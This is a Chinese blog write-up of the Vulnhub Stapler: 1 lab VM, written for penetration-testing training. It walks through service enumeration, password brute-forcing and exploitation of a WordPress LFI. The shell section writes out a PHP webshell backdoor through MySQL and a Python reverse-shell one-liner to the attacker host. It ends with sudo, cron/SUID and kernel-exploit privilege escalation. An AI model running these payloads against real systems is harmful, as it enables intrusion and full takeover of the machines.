---
title: 【Vulnhub】 Stapler：1
copyright: true
date: 2021-08-29 11:58:47
tags: [Vulnhub,VM,Web,Pentest,Vulnerability,Exploit,Writeup,Linux,FTP,SSH,SMB,CMS,Database,Bash,PHP,Python,Privilege,Trojan]
categories: [InfoSec,Pentest]
---

# 0x00 前言

本题的综合渗透靶机镜像来自 [Vulnhub](https://www.vulnhub.com/) 的 [Stapler: 1](https://www.vulnhub.com/entry/stapler-1,150/)，最终目标是获取靶机 root 权限并打印 flag。

靶机主要涉及**服务匿名访问、用户弱口令、错误配置、敏感信息泄露、文件上传、本地提权**等漏洞，提供了较为综合的渗透测试练习环境，能从中学习到常见的渗透技巧及漏洞利用方法，为初学者拓宽了渗透实战的新思路。

根据提示，至少有两条通路能**获取 shell 环境**，并至少有三种提权方法**得到 root 权限**。

- 题目链接：[https://www.vulnhub.com/entry/stapler-1,150/](https://www.vulnhub.com/entry/stapler-1,150/)

<!-- more -->

![description](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/description.png)

本文操作环境为 Windows 10 操作系统与 VMware Workstation 15 Pro 虚拟机，其中虚拟机需导入 Kali Linux 2020.4 系统作为攻击机，及 Stapler 的 Ubuntu 16.04 系统作为靶机。

***申明：本文仅用于安全技术学习，切勿用于非法用途，否则后果自负。***

# 0x01 靶机发现

首先，下载靶机镜像压缩包，解压后通过打开 ovf 文件将 vmdk 镜像导入 VMware，等待其初始化完成，出现系统登录界面：

![stapler_login](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/stapler_login.png)

注意到，靶机默认网络连接模式为**仅主机模式**，为保证后续扫描顺利进行，需调整为 **NAT 模式**。

> 小贴士：靶机调整网络连接模式后，需重启生效。

接着，打开 Kali 攻击机，将其网络连接模式与靶机保持一致。通过 `ifconfig eth0` 命令，可知**攻击机 IP 地址为 192.168.153.148**，再通过 `nmap -n -sn 192.168.153.0/24` 命令，得知**靶机 IP 地址为 192.168.153.147**：

![target_discovery](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/target_discovery.png)

值得一提的是，在 NAT 模式下，192.168.153.1 为宿主机 IP，192.168.153.2 为 NAT 设备 IP，192.168.153.254 为 DHCP 服务器 IP，具体请参考：

> [Selecting IP Addresses on a Host-only Network or NAT Configuration](https://www.vmware.com/support/ws55/doc/ws_net_advanced_ipaddress.html)

![address_in_nat](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/address_in_nat.png)

# 0x02 信息收集

## 端口探测

首先，对靶机一无所知的情况下，应使用 nmap 工具，探测其所有开放端口及对应服务：

```bash
nmap -n -sT -sV -O -p- 192.168.153.147
```

![nmap_scan_port](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/nmap_scan_port.png)

发现靶机上开启了 FTP、SSH、DNS、HTTP、Samba、MySQL 等服务，下面将进一步收集各服务的有效信息。

## 端口 21：FTP 服务

继续使用 nmap 工具，添加 `-A` 参数对端口 21 进行深入扫描，发现 FTP 服务存在**匿名访问漏洞**：

```bash
nmap -n -sT -sV -O -A -p21 192.168.153.147
```

![nmap_scan_port_21](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/nmap_scan_port_21.png)

使用 anonymous 用户名与任意口令登录后，发现一条给 **Harry** 的提示信息，并且在当前根目录下存在 **note 文件**，下载至本地后打印，发现是一条 **John** 给 **Elly** 的留言：

![ftp_anonymous_login](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/ftp_anonymous_login.png)

尝试使用上述信息出现的人名，作为 FTP 服务的用户名，再通过 hydra 工具检测是否存在空口令、同名口令、同名逆向口令等。结果显示，**elly 用户名存在同名逆向口令 ylle**：

```bash
hydra -L ftp_user_name -e nsr ftp://192.168.153.147
```

![hydra_ftp](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/hydra_ftp.png)

再使用 elly 用户名与 ylle 口令登录，发现当前根目录为挂载于 /etc/ 下：

![ftp_elly_login](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/ftp_elly_login.png)

下载系统用户配置文件 passwd 并打印，发现许多自定义的个人用户：

![get_passwd](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/get_passwd.png)

将其中具有可登录 shell 的用户筛选出来，存至 ssh_user_name：

```bash
cat passwd | grep -v -E "nologin|false" | cut -d ":" -f 1 > ssh_user_name
```

![extract_login_users](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/extract_login_users.png)

## 端口 22：SSH 服务

将上述 ssh_user_name 作为 SSH 服务的用户名列表，同样使用 hydra 工具检测是否存在空口令、同名口令、同名逆向口令等。结果显示，**SHayslett 用户名存在同名口令 SHayslett**：

```bash
hydra -L ssh_user_name -e nsr ssh://192.168.153.147
```

![hydra_ssh](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/hydra_ssh.png)

使用 SHayslett 用户名与 SHayslett 口令登录成功，并发现一条给 **Barry** 的提示信息。

## 端口 139：SMB 服务

使用 enum4linux 工具探测 SMB 服务，添加 `-a` 参数进行全面探测，并将结果存至 smb_result：

```bash
enum4linux -a 192.168.153.147 | tee smb_result
```

![enum4linux_all](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/enum4linux_all.png)

在用户信息扫描结果中，发现目标主机的用户列表：

![enum4linux_users](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/enum4linux_users.png)

若使用该列表中的用户名，对 FTP 与 SSH 服务进行爆破，同样能得到 elly 与 SHayslett 用户的弱口令，此处不再赘述。

接着，在共享服务扫描结果中，发现有效**共享服务名 tmp 与 kathy**：

![enum4linux_shares](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/enum4linux_shares.png)

使用 smbclient 工具连接 SMB 服务，其中 `-N` 参数指定空口令登录，**双斜杠后指定服务器地址，单斜杠后指定共享服务名**：

```bash
smbclient -N //192.168.153.147/tmp
```

在共享服务 tmp 下，只发现一个 ls 文件，下载至本地并打印，像是 root 用户某目录下的文件列举信息，其中还包含一个时间同步服务的相关文件：

![smbclient_tmp](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/smbclient_tmp.png)

```bash
smbclient -N //192.168.153.147/kathy
```

在共享服务 kathy 下，发现 kathy_stuff 与 backup 两个目录，其中包含了 todo-list.txt、vsftpd.conf、wordpress-4.tar.gz 三个文件，分别下载至本地后，均未搜出可利用的敏感信息：

todo-list.txt 包含一条给 kathy 留言，确保帮 Initech 备份了重要数据。

vsftpd.conf 为本地 FTP 服务配置文件，与 /etc/vsftpd.conf 内容相同。

wordpress-4.tar.gz 为 4.2.1 版本的 WordPress 服务原始代码。

![smbclient_kathy](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/smbclient_kathy.png)

## 端口 666：未知服务

针对未知服务的端口，可使用 nc 工具进行探测。结果显示为一堆乱码，但其中清晰可见 **message2.jpg 字符串**：

```bash
nc 192.168.153.147 666
```

![nc_detect](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/nc_detect.png)

将数据流重定向至本地文件 file_port_666，并使用 file 工具查看，结果显示为 **Zip 压缩包**。

继续使用 unzip 工具解压，得到 message2.jpg 图像文件，打开后发现一条给 **Scott** 的留言：

![nc_download](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/nc_download.png)

## 端口 80：PHP CLI 服务

在浏览器使用 HTTP 协议访问 80 端口，提示在网站根目录下找不到主页：

![http_80](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/http_80.png)

针对一般的 Web 服务，可先用 nikto 漏洞扫描工具进行初步探测。结果显示，根目录下存在 .bashrc 与 .profile 文件，说明根目录可能位于某个用户的主目录下：

遗憾的是，将上述文件下载至本地后，并未发现敏感信息。

```bash
nikto --host http://192.168.153.147/
```

![nikto_http_80](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/nikto_http_80.png)

## 端口 12380：WordPress 服务

在浏览器使用 HTTP 协议访问 12380 端口，弹出页面提示 `Coming Soon`：

![http_12380](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/http_12380.png)

查看网页源码，在底部注释中，发现一条 HR 部门给 **Zoe** 的留言：

值得注意的是，在 /etc/passwd 系统文件与 SMB 服务探测结果中，同样存在 zoe 用户。

![http_12380_source](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/http_12380_source.png)



先使用 nikto 漏洞扫描工具进行初步探测。结果显示，站点还**支持 HTTPS 协议**访问，并存在 **/admin112233/、/blogblog/、/phpmyadmin/** 等三个目录，存在 **/robots.txt、/icons/README** 等两个文件：

```bash
nikto --host http://192.168.153.147:12380/
```

![nikto_http_12380](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/nikto_http_12380.png)

在浏览器使用 HTTPS 协议访问 12380 端口，弹出页面提示 `Internal Index Page`：

![https_12380](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/https_12380.png)

访问 /robots.txt 文件，发现 Disallow 的目录为 /admin112233/ 与 /blogblog/，与扫描结果一致：

![https_12380_robots](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/https_12380_robots.png)

访问 /icons/README 文件，发现只是 Apache 图标目录下的默认文档，并无敏感信息：

![https_12380_icons_readme](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/https_12380_icons_readme.png)

访问 /admin112233/ 目录后，弹框提示 `This could of been a BeEF-XSS hook ;)`：

![https_12380_admin112233](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/https_12380_admin112233.png)

看样子是出题人挖了个坑等着我们跳，算是个小彩蛋吧。查看网页源码可发现，最终会被重定向至 http://www.xss-payloads.com 站点：

![https_12380_admin112233_source](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/https_12380_admin112233_source.png)

访问 /blogblog/ 目录后，发现是个名为 **INITECH** 的博客网页（曾在 todo-list.txt 中出现过，推断 INITECH 可能为公司名）：

![https_12380_blogblog](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/https_12380_blogblog.png)

查看网页源码可发现，博客站点通过 4.2.1 版本的 WordPress 搭建（其原始代码 wordpress-4.tar.gz 曾备份于 kathy 共享目录下）：

![https_12380_blogblog_source](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/https_12380_blogblog_source.png)

访问 /phpmyadmin/ 目录后，弹出 phpMyAdmin 登录页面（需使用有效 MySQL 用户名口令登录）:![phpmyadmin](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/https_12380_phpmyadmin.png)

接下来，使用 wpscan 工具进行针对性扫描。在这之前，先要配置 API Token。

在 [WPScan](https://wpscan.com/) 官网注册登录后，进入 Profile 页面获取 API Token，每天有 25 次免费调用机会：

![wpscan_api_token](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/wpscan_api_token.png)

并在 Kali Linux 当前 root 用户的主目录下，创建 ~/.wpscan/scan.yml 配置文件，写入以下内容：

```yaml
cli_options:
  api_token: YOUR_API_TOKEN
```

![wpscan_scan_yml](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/wpscan_scan_yml.png)

首先探测网站的有效用户名，添加 `--enumerate u1-100` 参数指定前 100 个用户名（实际上没这么多），并添加 `--disable-tls-check` 参数忽略 TLS 检查。结果显示，共有 17 个用户名，大部分与之前收集的相同：

```bash
wpscan --url https://192.168.153.147:12380/blogblog/ --enumerate u1-100 --disable-tls-check
```

![wpscan_enumerate_u](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/wpscan_enumerate_u.png)

再探测网站使用的所有插件，添加 `--enumerate ap` 参数指定扫描所有插件，并添加 `--plugins-detection aggressive` 参数指定主动扫描模式。结果显示，共有 4 个插件：

```bash
wpscan --url https://192.168.153.147:12380/blogblog/ --enumerate ap --plugins-detection aggressive --disable-tls-checks
```

![wpscan_enumerate_ap](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/wpscan_enumerate_ap.png)

# 0x03 Web 渗透

## Advanced Video 插件 LFI 漏洞利用

针对 WordPress 插件，可使用 searchsploit 工具搜索相关漏洞利用脚本。通过搜索插件名，发现 **Advanced Video 插件存在 [LFI 本地文件包含漏洞（EDB-ID 39646）](https://www.exploit-db.com/exploits/39646)**，并将其 EXP 脚本复制到当前目录：

```bash
searchsploit advanced video
searchsploit -m 39646
```

![searchsploit_advanced_video](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/searchsploit_advanced_video.png)

将 EXP 脚本中的 `url` 变量改为 https://192.168.153.147:12380/blogblog/ 后，通过 python 执行脚本，发现报错 `SSL: CERTIFICATE_VERIFY_FAILED`：

![exp_39646_error](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/exp_39646_error.png)

经探究，需要在 EXP 脚本打上补丁，使其忽略 SSL 的证书校验，具体请参考：

> [urllib and “SSL: CERTIFICATE_VERIFY_FAILED” Error](https://stackoverflow.com/questions/27835619/urllib-and-ssl-certificate-verify-failed-error)

![exp_39646_patch](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/exp_39646_patch.png)

修复报错后，成功执行 EXP 脚本。然而，并无结果回显，无法得知 wp-config.php 文件内容的输出路径。

接下来，使用 dirb 工具，配合其默认字典进行目录扫描。结果显示，可访问目录包括 /wp-admin/、/wp-content/、/wp-includes/ 等三个目录，与 WordPress 的默认目录结构相同：

```bash
dirb https://192.168.153.147:12380/blogblog
```

![dirb_blogblog](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/dirb_blogblog.png)

经过一番搜索，终于在 **/blogblog/wp-content/uploads/** 目录下发现可疑图像文件，其创建时间与 EXP 脚本执行时间一致：

![https_12380_blogblog_uploads](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/https_12380_blogblog_uploads.png)

点击图像文件后，提示报错并且无法打开。将其下载至本地后打印，发现文件内容实际上为 wp-config.php 配置：

```bash
wget --no-check-certificate https://192.168.153.147:12380/blogblog/wp-content/uploads/412823998.jpeg
```

![wget_wp_config](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/wget_wp_config.png)

仔细查看配置内容，终于发现了后端 MySQL 数据库的**用户名为 root，口令为 plbkac**：

![wp_config](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/wp_config.png)

## MySQL 深入探索

没想到 WordPress 服务居然以 root 用户连接 MySQL，至此意味着已完全掌控了 MySQL 的所有权，极其有利于进一步的信息收集与后渗透利用。

使用 root 用户名与 plbkac 口令登录 MySQL 后，可查看任意数据库名与表名。如查看 wordpress 库中的所有表名：

![mysql_show](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/mysql_show.png)

其中 **wp_users 表**中存储了 WordPress 的用户相关信息，**user_login 列**为登录用户名，**user_pass 列**为登录口令散列值：

![mysql_wp_users](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/mysql_wp_users.png)

截取以上 16 个用户的 user_login 与 user_pass 列，按 `<key>:<value>` 格式排列好，保存至 wp_user_login_pass 文件中。

接下来，使用 john 工具，配合系统自带字典 `/var/share/wordlists/rockyou.txt` 进行登录口令爆破。结果显示，其中**有 12 个用户使用了弱口令**：

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt wp_user_login_pass
```

![john_crack](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/john_crack.png)

# 0x04 持续控制

## 文件上传 PHP 反弹 shell

访问 /blogblog/wp-login.php 文件，弹出 WordPress 控制台登录页面：

![](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/https_12380_blogblog_wp_login.png)

使用 John 用户名与 incorrrect 口令登录后，进入控制台主页：

![https_12380_blogblog_wp_admin](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/https_12380_blogblog_wp_admin.png)

点击 Users 导航栏 ，发现 John、Peter、Vicki 用户均为管理员：

![](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/https_12380_blogblog_wp_users.png)

点击 Plugins 导航栏，发现插件上传安装页面，猜测可能存在文件上传漏洞：

![https_12380_blogblog_wp_add_plugins](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/https_12380_blogblog_wp_add_plugins.png)

尝试上传 [**php-reverse-shell.php**](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) 脚本，其中 `$ip` 变量为反弹 IP，需改为 Kali Linux 的 192.168.153.148 地址：

![php_reverse_shell](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/php_reverse_shell.png)

根据反弹 shell 脚本中的设置，使用 nc 工具监听 Kali Linux 的 1234 端口：

```bash
nc -nvlp 1234
```

![nc_listening_1234](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/nc_listening_1234.png)

同样地，在 /blogblog/wp-content/uploads/ 目录下，发现 php-reverse-shell.php 脚本文件，点击后发现靶机的 shell 已反弹至 Kali Linux 的 1234 端口：

![nc_listening_1234_php_getshell](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/nc_listening_1234_php_getshell.png)

至此，已获取靶机 www-data 系统用户的 shell，也说明 WordPress 是通过 **www-data** 用户启动的。

## 文件上传冰蝎 Webshell

由于 Kali Linux 2020.4 系统自带的 JDK 版本为 11.0.9，无法直接启动 [**Behinder_v3.0_Beta_11**](https://github.com/rebeyond/Behinder/releases/tag/Behinder_v3.0_Beta_11) 版本的 jar 包客户端。因此，本节操作将在 Windows 10 操作系统上，使用1.8.0 版本的 JDK 启动并演示。

打开冰蝎目录下的 server/shell.php 脚本文件，可见其默认连接密码为 **rebeyond**。随后，还是通过插件上传页面，将冰蝎 PHP Webshell 上传至 /blogblog/wp-content/uploads/ 目录下：

![behinder_upload_shell](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/behinder_upload_shell.png)

使用 java 工具启动冰蝎客户端，右击表格空包处新增 shell，填入 Webshell 上传后的访问路径，及其连接密码 rebeyond：

```powershell
java -jar .\Behinder.jar
```

![behinder_new_shell](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/behinder_new_shell.png)

新增 shell 后，右击打开，成功弹出 Webshell 管理窗口，获取到靶机 www-data 系统用户的 shell：

![behinder_get_shell](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/behinder_get_shell.png)

## MySQL 写入命令执行函数

先使用 elly 用户名与 ylle 口令登录 FTP 服务，下载 Apache 配置文件 apache2/sites-available/default-ssl.conf 文件后，发现其 HTTPS 服务的根路径为 **/var/www/https**，具体请参考：

> [How To Create a Self-Signed SSL Certificate for Apache in Ubuntu 18.04](https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04)

![get_default_ssl](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/get_default_ssl.png)

再使用 root 用户名与 plbkac 口令登录 MySQL，在 WordPress 服务的 /blogblog/wp-content/uploads/ 目录下，写入带有 PHP 命令执行函数的后门文件 **exec.php**：

```mysql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/https/blogblog/wp-content/uploads/exec.php";
```

![mysql_select_info_outfile](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/mysql_select_info_outfile.png)

尝试通过 `cmd=id` 参数访问该文件，发现确实能够返回 `id` 系统命令的执行结果：

![https_12380_blogblog_exec_id](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/https_12380_blogblog_exec_id.png)

接下来，使用 nc 工具监听 Kali Linux 的 1234 端口，再通过 `cmd` 参数传入 Python 反弹 shell，命令执行后，成功获取到靶机 www-data 系统用户的 shell：

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.153.148",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![nc_listening_1234_python_getshell](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/nc_listening_1234_python_getshell.png)

# 0x05 权限提升

## Sudo 提权

获取靶机 shell 环境后，首先从各个用户的 .bash_history 命令操作日志着手，搜索其中有价值的信息。

打印出日志后，发现两条包含了用户名与口令的 ssh 连接命令，其中 **JKanode 用户的口令为 thisimypassword，peter 用户的口令为 JZQuyIN5**：

```bash
cat /home/*/.bash_history | grep -v exit
```

![cat_bash_history](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/cat_bash_history.png)

经验证，JKanode 与 peter 用户均能登录成功，其中 peter 用户会返回一个 zsh，按下 `q` 退出其配置初始化过程后，执行 `whoami && id` 命令查看用户信息，发现 **peter 用户拥有 sudo 用户组权限**：

![ssh_peter](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/ssh_peter.png)

执行 `sudo -l` 命令并输入密码，发现 peter 用户的 sudo 权限为 **(ALL : ALL) ALL**，表示 peter 用户可以在任何主机上，以任意用户的身份执行任意命令，具体请参考：

> [linux详解sudoers](https://www.cnblogs.com/jing99/p/9323080.html)

最后执行 `sudo su - root` 命令，即可获得 root 用户权限：

![sudo_root](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/sudo_root.png)

## Cron Jobs 提权

获取靶机 shell 环境后，还可以查看 cron 计划任务，搜索其中有价值的信息。

打印 cron 计划任务文件列表，发现若干可疑文件：

```bash
ls -alh /etc/*cron*
```

![ls_cron_jobs](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/ls_cron_jobs.png)

经过一番搜索，在 **/etc/cron.d/logrotate** 计划任务中，发现以 **root** 用户执行的 shell 脚本 **/usr/local/sbin/cron-logrotate.sh**，该脚本 5 分钟执行一次，但无实际任务执行。

此外，脚本权限为 **`-rwxrwxrwx`**，说明**任何用户可在此设置计划任务，并以 root 用户权限执行**：

![ls_cron_logrotate](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/ls_cron_logrotate.png)

接下来设置计划任务，将 /bin/bash 文件复制为 **/tmp/getroot** 文件，将其属主改为 **`root:root`**，并赋予 SUID 权限 **`-rwsr-xr-x`**：

```bash
echo "cp /bin/bash /tmp/getroot; chown root:root /tmp/getroot; chmod u+s /tmp/getroot" >> /usr/local/sbin/cron-logrotate.sh
```

![get_bash_with_suid](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/get_bash_with_suid.png)

等待 5 分钟后，触发计划任务执行，发现 /tmp/getroot 文件创建成功，并且其属主与权限均符合预期。

最后执行 `/tmp/getroot -p` 命令，能够以 root 用户权限启动 bash，即可获得 root 用户的命令执行环境：

![get_root_by_bash](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/get_root_by_bash.png)

## CVE-2016-4557 内核漏洞提权

获取靶机 shell 环境后，查看系统内核与发行版相关信息。结果显示，靶机系统内核版本为 **4.4.0-21-generic**，发行版为 **Ubuntu 16.04 LTS**：

```bash
uname -a
cat /proc/version
lsb_release -a
```

![system_info](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/system_info.png)

针对 Ubuntu 16.04 LTS 发行版，使用 searchsploit 工具搜索相关漏洞利用脚本。结果显示，**Linux Kernel 4.4.x 内核存在[本地权限提升漏洞（EDB-ID 39772）](https://www.exploit-db.com/exploits/39772)** ，并将其 EXP 说明文档复制到当前目录：

```bash
searchsploit ubuntu 16.04 privilege escalation
searchsploit -m 39772
```

![searchsploit_ubuntu](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/searchsploit_ubuntu.png)

根据文档下方提示，从 Github 下载 EXP 代码：

```bash
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
```

![wget_exp_39772](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/wget_exp_39772.png)

使用 unzip 工具解压 39772.zip 文件后，文档提示需将 EXP 代码压缩包 **39772/exploit.tar** 上传至目标主机，再通过执行 `./compile.sh` 与 `./doubleput` 命令完成提权。

在 39772/ 目录下，通过 python 启动一个简单 HTTP 服务的端口监听：

```bash
python -m SimpleHTTPServer 8000
```

![unzip_39772](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/unzip_39772.png)

回到靶机 shell 环境，将 exploit.tar 文件下载至本地，并使用 tar 工具解压：

```bash
wget http://192.168.153.148:8000/exploit.tar
```

![wget_exploit_tar](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/wget_exploit_tar.png)

最后在 ebpf_mapfd_doubleput_exploit/ 目录下，执行 `./compile.sh` 与 `./doubleput` 命令，即可获得 root 用户权限：

![get_root_by_exp](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/get_root_by_exp.png)

# 0x06 小结

获取 root 用户权限后，在其主目录下发现 flag.txt 文件，最终得到 flag 为 **b6b545dc11b7a270f4bad23432190c75162c4a2b**，至此宣告靶机渗透过程结束：

![cat_flag](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/Vulnhub_Stapler_1/cat_flag.png)

磕磕绊绊地，总算完成了 [Stapler: 1](https://www.vulnhub.com/entry/stapler-1,150/) 靶机渗透练习，不仅从中丰富了自己的工具库，而且还学习到了各类漏洞的利用方法，拓展了渗透测试思路，可谓是收获良多，感谢 [g0tmi1k](https://twitter.com/g0tmi1k) 等大佬提供的靶机练习。

由于笔者水平有限，本文渗透思路多借鉴于以下 writeup，但也不乏创新思路点。对于**持续控制**与**权限提升**技巧，勉强达到靶机要求的合格水平，各位若有其他新颖独特的思路，还望不吝赐教，多多交流。

本文涉及的文章参考，请移步至：

> [VulnHub — Stapler: 1](https://bond-o.medium.com/vulnhub-stapler-1-ab928900d614)
> [Stapler: 1 Walkthrough](https://medium.com/@Kan1shka9/stapler-1-walkthrough-e1f2a667ea4)
> [VulnHub ‘Stapler: 1’ - CTF](https://jhalon.github.io/vulnhub-stapler1/)
> [Vulnhub-靶机-STAPLER: 1](https://www.cnblogs.com/autopwn/p/13864611.html)
> [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
> [VMware虚拟机三种网络模式：桥接模式，NAT模式，仅主机模式](https://blog.csdn.net/qq_39192827/article/details/85872025)